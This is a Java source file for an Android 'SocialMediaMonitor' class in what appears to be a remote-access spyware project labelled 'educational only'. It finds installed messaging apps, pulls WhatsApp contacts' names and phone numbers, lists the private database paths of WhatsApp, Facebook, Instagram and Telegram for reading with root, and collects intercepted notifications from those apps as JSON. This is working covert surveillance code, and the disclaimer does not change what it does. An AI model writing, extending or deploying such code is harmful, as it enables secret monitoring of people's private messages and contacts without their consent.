package com.remoteaccess.educational.advanced;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * SOCIAL MEDIA MONITOR - Track Social Media Activity
 * 
 * ⚠️ EDUCATIONAL PURPOSE ONLY
 * 
 * FEATURES:
 * - Monitor WhatsApp messages
 * - Track Facebook activity
 * - Instagram monitoring
 * - Telegram tracking
 * - Social media analytics
 * 
 * NOTE:
 * - Requires root access for full functionality
 * - Or uses notification interception
 * - Educational demonstration only
 * 
 * USE CASES:
 * - Parental control
 * - Security analysis
 * - Educational research
 */
public class SocialMediaMonitor {

    private Context context;

    // Common social media package names
    private static final String WHATSAPP = "com.whatsapp";
    private static final String WHATSAPP_BUSINESS = "com.whatsapp.w4b";
    private static final String FACEBOOK = "com.facebook.katana";
    private static final String MESSENGER = "com.facebook.orca";
    private static final String INSTAGRAM = "com.instagram.android";
    private static final String TELEGRAM = "org.telegram.messenger";
    private static final String SNAPCHAT = "com.snapchat.android";
    private static final String TWITTER = "com.twitter.android";
    private static final String TIKTOK = "com.zhiliaoapp.musically";

    public SocialMediaMonitor(Context context) {
        this.context = context;
    }

    /**
     * Get installed social media apps
     */
    public JSONObject getInstalledSocialApps() {
        JSONObject result = new JSONObject();
        
        try {
            JSONArray apps = new JSONArray();
            
            String[] socialApps = {
                WHATSAPP, WHATSAPP_BUSINESS, FACEBOOK, MESSENGER,
                INSTAGRAM, TELEGRAM, SNAPCHAT, TWITTER, TIKTOK
            };
            
            String[] appNames = {
                "WhatsApp", "WhatsApp Business", "Facebook", "Messenger",
                "Instagram", "Telegram", "Snapchat", "Twitter", "TikTok"
            };
            
            for (int i = 0; i < socialApps.length; i++) {
                if (isAppInstalled(socialApps[i])) {
                    JSONObject app = new JSONObject();
                    app.put("packageName", socialApps[i]);
                    app.put("appName", appNames[i]);
                    app.put("installed", true);
                    apps.put(app);
                }
            }

            result.put("success", true);
            result.put("apps", apps);
            result.put("count", apps.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get WhatsApp contacts
     */
    public JSONObject getWhatsAppContacts() {
        JSONObject result = new JSONObject();
        
        try {
            if (!isAppInstalled(WHATSAPP)) {
                result.put("success", false);
                result.put("error", "WhatsApp not installed");
                return result;
            }

            JSONArray contacts = new JSONArray();
            
            // Get contacts with WhatsApp
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.Data.CONTENT_URI,
                null,
                ContactsContract.Data.MIMETYPE + "=?",
                new String[]{"vnd.android.cursor.item/vnd.com.whatsapp.profile"},
                null
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.Data.DATA1));
                    
                    contact.put("name", name);
                    contact.put("number", number);
                    
                    contacts.put(contact);
                }
                cursor.close();
            }

            result.put("success", true);
            result.put("contacts", contacts);
            result.put("count", contacts.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get social media data directories
     */
    public JSONObject getSocialMediaDataPaths() {
        JSONObject result = new JSONObject();
        
        try {
            JSONObject paths = new JSONObject();
            
            // WhatsApp paths
            JSONObject whatsapp = new JSONObject();
            whatsapp.put("database", "/data/data/com.whatsapp/databases/msgstore.db");
            whatsapp.put("media", "/storage/emulated/0/WhatsApp/Media");
            whatsapp.put("backups", "/storage/emulated/0/WhatsApp/Databases");
            paths.put("whatsapp", whatsapp);
            
            // Facebook paths
            JSONObject facebook = new JSONObject();
            facebook.put("database", "/data/data/com.facebook.katana/databases");
            facebook.put("cache", "/data/data/com.facebook.katana/cache");
            paths.put("facebook", facebook);
            
            // Instagram paths
            JSONObject instagram = new JSONObject();
            instagram.put("database", "/data/data/com.instagram.android/databases");
            instagram.put("cache", "/data/data/com.instagram.android/cache");
            paths.put("instagram", instagram);
            
            // Telegram paths
            JSONObject telegram = new JSONObject();
            telegram.put("database", "/data/data/org.telegram.messenger/files");
            telegram.put("cache", "/data/data/org.telegram.messenger/cache");
            paths.put("telegram", telegram);

            result.put("success", true);
            result.put("paths", paths);
            result.put("note", "Requires root access to read these paths");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get social media statistics
     */
    public JSONObject getSocialMediaStats() {
        JSONObject result = new JSONObject();
        
        try {
            JSONObject stats = new JSONObject();
            
            String[] socialApps = {
                WHATSAPP, FACEBOOK, INSTAGRAM, TELEGRAM, SNAPCHAT
            };
            
            String[] appNames = {
                "WhatsApp", "Facebook", "Instagram", "Telegram", "Snapchat"
            };
            
            for (int i = 0; i < socialApps.length; i++) {
                if (isAppInstalled(socialApps[i])) {
                    JSONObject appStat = new JSONObject();
                    appStat.put("installed", true);
                    appStat.put("packageName", socialApps[i]);
                    
                    // Get app data size
                    File dataDir = new File("/data/data/" + socialApps[i]);
                    if (dataDir.exists()) {
                        appStat.put("dataSize", getDirectorySize(dataDir));
                    }
                    
                    stats.put(appNames[i], appStat);
                }
            }

            result.put("success", true);
            result.put("stats", stats);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Check if app is installed
     */
    private boolean isAppInstalled(String packageName) {
        try {
            context.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Get directory size
     */
    private long getDirectorySize(File directory) {
        long size = 0;
        
        if (directory.isFile()) {
            return directory.length();
        }
        
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    size += file.length();
                } else {
                    size += getDirectorySize(file);
                }
            }
        }
        
        return size;
    }

    /**
     * Monitor social media notifications
     * (Uses NotificationInterceptor)
     */
    public JSONObject getSocialMediaNotifications() {
        JSONObject result = new JSONObject();
        
        try {
            JSONArray socialNotifs = new JSONArray();
            
            // Get all notifications
            JSONObject allNotifs = NotificationInterceptor.getAllNotifications();
            
            if (allNotifs.getBoolean("success")) {
                JSONArray notifications = allNotifs.getJSONArray("notifications");
                
                // Filter social media notifications
                String[] socialApps = {
                    WHATSAPP, WHATSAPP_BUSINESS, FACEBOOK, MESSENGER,
                    INSTAGRAM, TELEGRAM, SNAPCHAT, TWITTER, TIKTOK
                };
                
                for (int i = 0; i < notifications.length(); i++) {
                    JSONObject notif = notifications.getJSONObject(i);
                    String packageName = notif.getString("packageName");
                    
                    for (String socialApp : socialApps) {
                        if (packageName.equals(socialApp)) {
                            socialNotifs.put(notif);
                            break;
                        }
                    }
                }
            }

            result.put("success", true);
            result.put("notifications", socialNotifs);
            result.put("count", socialNotifs.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }
}
